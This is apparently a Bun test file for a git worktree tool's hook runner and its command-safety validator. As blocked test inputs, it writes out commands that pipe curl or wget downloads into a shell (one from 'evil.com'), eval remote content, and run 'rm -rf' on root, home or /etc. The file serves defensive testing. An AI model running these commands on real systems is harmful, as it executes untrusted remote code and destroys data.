import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
	buildWorktreeEnv,
	executeCommand,
	executeHooks,
	getShellConfig,
	validateHookCommand,
	validateHookCommands,
} from '@/lib/hooks';
import type { WorktreeConfig, WorktreeEnv } from '@/lib/types';

describe('getShellConfig', () => {
	test('returns sh -c for Unix platforms', () => {
		const config = getShellConfig('darwin');
		expect(config.shell).toBe('sh');
		expect(config.flag).toBe('-c');
	});

	test('returns sh -c for Linux', () => {
		const config = getShellConfig('linux');
		expect(config.shell).toBe('sh');
		expect(config.flag).toBe('-c');
	});

	test('returns cmd /c for Windows', () => {
		const config = getShellConfig('win32');
		expect(config.shell).toBe('cmd');
		expect(config.flag).toBe('/c');
	});

	test('uses process.platform by default', () => {
		const config = getShellConfig();
		expect(config.shell).toBeTruthy();
		expect(config.flag).toBeTruthy();
	});
});

describe('executeCommand', () => {
	test('executes command and returns result', async () => {
		const result = await executeCommand('echo test', process.cwd());
		expect(result.exitCode).toBe(0);
		expect(result.stdout.toString()).toContain('test');
	});

	test('returns non-zero exit code for failed commands', async () => {
		const result = await executeCommand('false', process.cwd());
		expect(result.exitCode).toBe(1);
	});
});

describe('hook execution', () => {
	let testDir: string;

	beforeEach(async () => {
		testDir = await mkdtemp(join(tmpdir(), 'worktree-hook-test-'));
	});

	afterEach(async () => {
		await rm(testDir, { recursive: true, force: true });
	});

	test('executes simple command', async () => {
		const outputFile = join(testDir, 'output.txt');
		const config: WorktreeConfig = {
			post_create: [`echo "test" > ${outputFile}`],
		};

		await executeHooks(config, 'post_create', { cwd: testDir });

		const output = await Bun.file(outputFile).text();
		expect(output.trim()).toBe('test');
	});

	test('executes command with single quotes', async () => {
		const outputFile = join(testDir, 'output.txt');
		const config: WorktreeConfig = {
			post_create: [`echo 'hello world' > ${outputFile}`],
		};

		await executeHooks(config, 'post_create', { cwd: testDir });

		const output = await Bun.file(outputFile).text();
		expect(output.trim()).toBe('hello world');
	});

	test('executes command with double quotes', async () => {
		const outputFile = join(testDir, 'output.txt');
		const config: WorktreeConfig = {
			post_create: [`echo "double quotes" > ${outputFile}`],
		};

		await executeHooks(config, 'post_create', { cwd: testDir });

		const output = await Bun.file(outputFile).text();
		expect(output.trim()).toBe('double quotes');
	});

	test('executes chained commands', async () => {
		const outputFile = join(testDir, 'output.txt');
		const config: WorktreeConfig = {
			post_create: [`echo "first" > ${outputFile} && echo "second" >> ${outputFile}`],
		};

		await executeHooks(config, 'post_create', { cwd: testDir });

		const output = await Bun.file(outputFile).text();
		expect(output.trim()).toBe('first\nsecond');
	});

	test('executes multiple hooks sequentially', async () => {
		const file1 = join(testDir, 'file1.txt');
		const file2 = join(testDir, 'file2.txt');
		const config: WorktreeConfig = {
			post_create: [`echo "hook1" > ${file1}`, `echo "hook2" > ${file2}`],
		};

		await executeHooks(config, 'post_create', { cwd: testDir });

		expect(await Bun.file(file1).text()).toContain('hook1');
		expect(await Bun.file(file2).text()).toContain('hook2');
	});

	test('skips hooks when skipHooks is true', async () => {
		const outputFile = join(testDir, 'output.txt');
		const config: WorktreeConfig = {
			post_create: [`echo "should not run" > ${outputFile}`],
		};

		await executeHooks(config, 'post_create', { cwd: testDir, skipHooks: true });

		const exists = await Bun.file(outputFile).exists();
		expect(exists).toBe(false);
	});

	test('continues after failed hook', async () => {
		const outputFile = join(testDir, 'output.txt');
		const config: WorktreeConfig = {
			post_create: [
				'false', // exits with 1
				`echo "continued" > ${outputFile}`,
			],
		};

		await executeHooks(config, 'post_create', { cwd: testDir, trustHooks: true });

		const output = await Bun.file(outputFile).text();
		expect(output.trim()).toBe('continued');
	});

	test('executes pre_remove hooks', async () => {
		const outputFile = join(testDir, 'pre-remove.txt');
		const config: WorktreeConfig = {
			pre_remove: [`echo "pre-remove executed" > ${outputFile}`],
		};

		await executeHooks(config, 'pre_remove', { cwd: testDir });

		const output = await Bun.file(outputFile).text();
		expect(output.trim()).toBe('pre-remove executed');
	});

	test('executes post_remove hooks', async () => {
		const outputFile = join(testDir, 'post-remove.txt');
		const config: WorktreeConfig = {
			post_remove: [`echo "post-remove executed" > ${outputFile}`],
		};

		await executeHooks(config, 'post_remove', { cwd: testDir });

		const output = await Bun.file(outputFile).text();
		expect(output.trim()).toBe('post-remove executed');
	});

	test('outputs stdout when verbose is true', async () => {
		const config: WorktreeConfig = {
			post_create: ['echo "verbose output"'],
		};

		const originalLog = console.log;
		let loggedOutput = '';
		console.log = (msg: string) => {
			loggedOutput += msg;
		};

		await executeHooks(config, 'post_create', { cwd: testDir, verbose: true });

		console.log = originalLog;
		expect(loggedOutput).toContain('verbose output');
	});

	test('outputs stderr when verbose is true and command fails', async () => {
		const config: WorktreeConfig = {
			post_create: ['sh -c "echo error >&2; exit 1"'],
		};

		const originalError = console.error;
		let errorOutput = '';
		console.error = (msg: string) => {
			errorOutput += msg.toString();
		};

		await executeHooks(config, 'post_create', { cwd: testDir, verbose: true, trustHooks: true });

		console.error = originalError;
		expect(errorOutput).toContain('error');
	});

	test('does not output when verbose is false', async () => {
		const config: WorktreeConfig = {
			post_create: ['echo "should not see this"'],
		};

		const originalLog = console.log;
		let loggedOutput = '';
		console.log = (msg: string) => {
			loggedOutput += msg;
		};

		await executeHooks(config, 'post_create', { cwd: testDir, verbose: false });

		console.log = originalLog;
		expect(loggedOutput).toBe('');
	});
});

describe('buildWorktreeEnv', () => {
	test('builds correct environment variables', () => {
		const context: WorktreeEnv = {
			worktreePath: '/path/to/worktree',
			branch: 'feature/test',
			mainPath: '/path/to/main',
		};

		const env = buildWorktreeEnv(context);

		expect(env.WORKTREE_PATH).toBe('/path/to/worktree');
		expect(env.WORKTREE_BRANCH).toBe('feature/test');
		expect(env.WORKTREE_MAIN_PATH).toBe('/path/to/main');
		expect(env.WORKTREE_PROJECT).toBe('main');
	});

	test('extracts project name from main path', () => {
		const context: WorktreeEnv = {
			worktreePath: '/home/user/repos/my-project/.worktrees/feature',
			branch: 'feature/awesome',
			mainPath: '/home/user/repos/my-project',
		};

		const env = buildWorktreeEnv(context);

		expect(env.WORKTREE_PROJECT).toBe('my-project');
	});
});

describe('environment variables in hooks', () => {
	let testDir: string;

	beforeEach(async () => {
		testDir = await mkdtemp(join(tmpdir(), 'worktree-env-test-'));
	});

	afterEach(async () => {
		await rm(testDir, { recursive: true, force: true });
	});

	test('executeCommand passes environment variables', async () => {
		const outputFile = join(testDir, 'env-output.txt');
		const env = {
			WORKTREE_PATH: '/test/path',
			WORKTREE_BRANCH: 'test-branch',
		};

		await executeCommand(`echo "$WORKTREE_PATH|$WORKTREE_BRANCH" > ${outputFile}`, testDir, env);

		const output = await Bun.file(outputFile).text();
		expect(output.trim()).toBe('/test/path|test-branch');
	});

	test('executeHooks passes worktree env context', async () => {
		const outputFile = join(testDir, 'hook-env.txt');
		const config: WorktreeConfig = {
			post_create: [
				`echo "$WORKTREE_PATH|$WORKTREE_BRANCH|$WORKTREE_MAIN_PATH|$WORKTREE_PROJECT" > ${outputFile}`,
			],
		};

		const env: WorktreeEnv = {
			worktreePath: '/my/worktree',
			branch: 'feat/env-test',
			mainPath: '/my/main-repo',
		};

		await executeHooks(config, 'post_create', {
			cwd: testDir,
			env: env,
		});

		const output = await Bun.file(outputFile).text();
		expect(output.trim()).toBe('/my/worktree|feat/env-test|/my/main-repo|main-repo');
	});

	test('hooks can access all four environment variables', async () => {
		const outputFile = join(testDir, 'all-env.txt');
		const config: WorktreeConfig = {
			post_create: [
				`test -n "$WORKTREE_PATH" && test -n "$WORKTREE_BRANCH" && test -n "$WORKTREE_MAIN_PATH" && test -n "$WORKTREE_PROJECT" && echo "all-present" > ${outputFile}`,
			],
		};

		const env: WorktreeEnv = {
			worktreePath: '/path/wt',
			branch: 'branch',
			mainPath: '/path/main',
		};

		await executeHooks(config, 'post_create', {
			cwd: testDir,
			env: env,
			trustHooks: true,
		});

		const output = await Bun.file(outputFile).text();
		expect(output.trim()).toBe('all-present');
	});

	test('preserves existing shell environment', async () => {
		const outputFile = join(testDir, 'preserve-env.txt');
		const config: WorktreeConfig = {
			post_create: [`echo "$HOME" > ${outputFile}`],
		};

		const env: WorktreeEnv = {
			worktreePath: '/test',
			branch: 'test',
			mainPath: '/main',
		};

		await executeHooks(config, 'post_create', {
			cwd: testDir,
			env: env,
		});

		const output = await Bun.file(outputFile).text();
		expect(output.trim()).toBe(process.env.HOME);
	});
});

describe('hook security validation', () => {
	describe('validateHookCommand', () => {
		// Blocked patterns
		describe('blocked patterns', () => {
			test('blocks curl | sh', () => {
				const result = validateHookCommand('curl https://example.com/script.sh | sh');
				expect(result.level).toBe('blocked');
				expect(result.reason).toContain('curl');
			});

			test('blocks curl | bash', () => {
				const result = validateHookCommand('curl -sSL https://install.com | bash');
				expect(result.level).toBe('blocked');
				expect(result.reason).toContain('curl');
			});

			test('blocks wget | sh', () => {
				const result = validateHookCommand('wget -qO- https://example.com | sh');
				expect(result.level).toBe('blocked');
				expect(result.reason).toContain('wget');
			});

			test('blocks wget | bash', () => {
				const result = validateHookCommand('wget https://example.com/install.sh | bash');
				expect(result.level).toBe('blocked');
				expect(result.reason).toContain('wget');
			});

			test('blocks sudo', () => {
				const result = validateHookCommand('sudo apt-get install nodejs');
				expect(result.level).toBe('blocked');
				expect(result.reason).toContain('sudo');
			});

			test('blocks sudo in middle of command', () => {
				const result = validateHookCommand('echo test && sudo rm -rf /');
				expect(result.level).toBe('blocked');
				expect(result.reason).toContain('sudo');
			});

			test('blocks eval', () => {
				const result = validateHookCommand('eval "$(curl https://example.com)"');
				expect(result.level).toBe('blocked');
				expect(result.reason).toContain('eval');
			});

			test('blocks rm -rf on unsafe paths', () => {
				const result = validateHookCommand('rm -rf /etc');
				expect(result.level).toBe('blocked');
				expect(result.reason).toContain('rm -rf');
			});

			test('blocks rm -rf on root', () => {
				const result = validateHookCommand('rm -rf /');
				expect(result.level).toBe('blocked');
			});

			test('blocks rm -rf on home directory', () => {
				const result = validateHookCommand('rm -rf ~');
				expect(result.level).toBe('blocked');
			});

			test('blocks rm -rf with multiple flags', () => {
				const result = validateHookCommand('rm -r -f /var/important');
				expect(result.level).toBe('blocked');
			});
		});

		// Safe rm -rf paths
		describe('safe rm -rf paths', () => {
			test('allows rm -rf node_modules', () => {
				const result = validateHookCommand('rm -rf node_modules');
				expect(result.level).toBe('safe');
			});

			test('allows rm -rf dist', () => {
				const result = validateHookCommand('rm -rf dist');
				expect(result.level).toBe('safe');
			});

			test('allows rm -rf .cache', () => {
				const result = validateHookCommand('rm -rf .cache');
				expect(result.level).toBe('safe');
			});

			test('allows rm -rf build', () => {
				const result = validateHookCommand('rm -rf build');
				expect(result.level).toBe('safe');
			});

			test('allows rm -rf coverage', () => {
				const result = validateHookCommand('rm -rf coverage');
				expect(result.level).toBe('safe');
			});

			test('allows rm -rf with path prefix', () => {
				const result = validateHookCommand('rm -rf ./node_modules');
				expect(result.level).toBe('safe');
			});

			test('allows rm -rf with full path to safe dir', () => {
				const result = validateHookCommand('rm -rf /home/user/project/node_modules');
				expect(result.level).toBe('safe');
			});
		});

		// Safe patterns
		describe('safe patterns', () => {
			test('allows npm install', () => {
				const result = validateHookCommand('npm install');
				expect(result.level).toBe('safe');
			});

			test('allows npm ci', () => {
				const result = validateHookCommand('npm ci');
				expect(result.level).toBe('safe');
			});

			test('allows npm run build', () => {
				const result = validateHookCommand('npm run build');
				expect(result.level).toBe('safe');
			});

			test('allows yarn', () => {
				const result = validateHookCommand('yarn');
				expect(result.level).toBe('safe');
			});

			test('allows yarn install', () => {
				const result = validateHookCommand('yarn install');
				expect(result.level).toBe('safe');
			});

			test('allows pnpm install', () => {
				const result = validateHookCommand('pnpm install');
				expect(result.level).toBe('safe');
			});

			test('allows bun install', () => {
				const result = validateHookCommand('bun install');
				expect(result.level).toBe('safe');
			});

			test('allows docker compose', () => {
				const result = validateHookCommand('docker compose up -d');
				expect(result.level).toBe('safe');
			});

			test('allows docker-compose', () => {
				const result = validateHookCommand('docker-compose build');
				expect(result.level).toBe('safe');
			});

			test('allows mkdir', () => {
				const result = validateHookCommand('mkdir -p src/components');
				expect(result.level).toBe('safe');
			});

			test('allows cp', () => {
				const result = validateHookCommand('cp .env.example .env');
				expect(result.level).toBe('safe');
			});

			test('allows mv', () => {
				const result = validateHookCommand('mv old.txt new.txt');
				expect(result.level).toBe('safe');
			});

			test('allows touch', () => {
				const result = validateHookCommand('touch .env');
				expect(result.level).toBe('safe');
			});

			test('allows echo', () => {
				const result = validateHookCommand('echo "hello" > file.txt');
				expect(result.level).toBe('safe');
			});

			test('allows cat', () => {
				const result = validateHookCommand('cat package.json');
				expect(result.level).toBe('safe');
			});

			test('allows ls', () => {
				const result = validateHookCommand('ls -la');
				expect(result.level).toBe('safe');
			});

			test('allows pwd', () => {
				const result = validateHookCommand('pwd');
				expect(result.level).toBe('safe');
			});

			test('allows git fetch', () => {
				const result = validateHookCommand('git fetch origin');
				expect(result.level).toBe('safe');
			});

			test('allows git pull', () => {
				const result = validateHookCommand('git pull origin main');
				expect(result.level).toBe('safe');
			});

			test('allows make', () => {
				const result = validateHookCommand('make build');
				expect(result.level).toBe('safe');
			});

			test('allows cargo build', () => {
				const result = validateHookCommand('cargo build --release');
				expect(result.level).toBe('safe');
			});

			test('allows go build', () => {
				const result = validateHookCommand('go build ./...');
				expect(result.level).toBe('safe');
			});

			test('allows pip install', () => {
				const result = validateHookCommand('pip install -r requirements.txt');
				expect(result.level).toBe('safe');
			});

			test('allows bundle install', () => {
				const result = validateHookCommand('bundle install');
				expect(result.level).toBe('safe');
			});

			test('allows composer install', () => {
				const result = validateHookCommand('composer install');
				expect(result.level).toBe('safe');
			});
		});

		// Risky patterns (unknown commands)
		describe('risky patterns', () => {
			test('marks unknown commands as risky', () => {
				const result = validateHookCommand('./scripts/custom-setup.sh');
				expect(result.level).toBe('risky');
				expect(result.reason).toContain('Unknown');
			});

			test('marks python scripts as risky', () => {
				const result = validateHookCommand('python setup.py');
				expect(result.level).toBe('risky');
			});

			test('marks ruby scripts as risky', () => {
				const result = validateHookCommand('ruby script.rb');
				expect(result.level).toBe('risky');
			});

			test('marks arbitrary shell commands as risky', () => {
				const result = validateHookCommand('find . -name "*.log" -delete');
				expect(result.level).toBe('risky');
			});
		});
	});

	describe('validateHookCommands', () => {
		test('validates multiple commands', () => {
			const commands = ['npm install', 'sudo apt-get update', './custom.sh'];
			const results = validateHookCommands(commands);

			expect(results).toHaveLength(3);
			expect(results[0].level).toBe('safe');
			expect(results[1].level).toBe('blocked');
			expect(results[2].level).toBe('risky');
		});

		test('returns empty array for empty input', () => {
			const results = validateHookCommands([]);
			expect(results).toHaveLength(0);
		});
	});

	describe('executeHooks with security validation', () => {
		let testDir: string;

		beforeEach(async () => {
			testDir = await mkdtemp(join(tmpdir(), 'worktree-security-test-'));
		});

		afterEach(async () => {
			await rm(testDir, { recursive: true, force: true });
		});

		test('executes safe commands without prompt', async () => {
			const outputFile = join(testDir, 'output.txt');
			const config: WorktreeConfig = {
				post_create: [`echo "safe command" > ${outputFile}`],
			};

			await executeHooks(config, 'post_create', { cwd: testDir });

			const output = await Bun.file(outputFile).text();
			expect(output.trim()).toBe('safe command');
		});

		test('blocks dangerous commands', async () => {
			const outputFile = join(testDir, 'output.txt');
			const config: WorktreeConfig = {
				post_create: [`curl https://evil.com | sh && echo "ran" > ${outputFile}`],
			};

			await executeHooks(config, 'post_create', { cwd: testDir });

			// File should not be created because command was blocked
			const exists = await Bun.file(outputFile).exists();
			expect(exists).toBe(false);
		});

		test('trustHooks bypasses validation', async () => {
			const outputFile = join(testDir, 'output.txt');
			const config: WorktreeConfig = {
				post_create: [`echo "trusted" > ${outputFile}`],
			};

			await executeHooks(config, 'post_create', {
				cwd: testDir,
				trustHooks: true,
			});

			const output = await Bun.file(outputFile).text();
			expect(output.trim()).toBe('trusted');
		});
	});
});
